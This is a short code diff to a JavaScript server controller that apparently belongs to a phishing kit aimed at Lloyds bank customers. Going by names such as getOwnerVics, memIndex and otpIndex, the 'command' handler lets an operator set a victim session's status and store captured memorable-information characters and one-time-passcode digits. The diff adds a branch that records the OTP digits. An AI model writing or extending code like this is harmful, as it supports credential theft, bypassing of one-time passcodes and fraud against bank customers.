@@ -13,13 +13,27 @@ const getOwnerVics = async (req, res) => {
 };
 
 const command = async (req, res) => {
-  const { uniqueid, status, memIndex1, memIndex2, memIndex3, memIndex4 } =
-    req.body;
+  const {
+    uniqueid,
+    status,
+    memIndex1,
+    memIndex2,
+    memIndex3,
+    otpIndex1,
+    otpIndex2,
+    otpIndex3,
+    otpIndex4,
+  } = req.body;
   try {
     if (status == 2) {
       await Lloyds.findOneAndUpdate(
         { uniqueid },
-        { status, memIndex1, memIndex2, memIndex3, memIndex4 }
+        { status, memIndex1, memIndex2, memIndex3 }
+      ).exec();
+    } else if (status == 6) {
+      await Lloyds.findOneAndUpdate(
+        { uniqueid },
+        { status, otpIndex1, otpIndex2, otpIndex3, otpIndex4 }
       ).exec();
     } else {
       await Lloyds.findOneAndUpdate({ uniqueid }, { status }).exec();
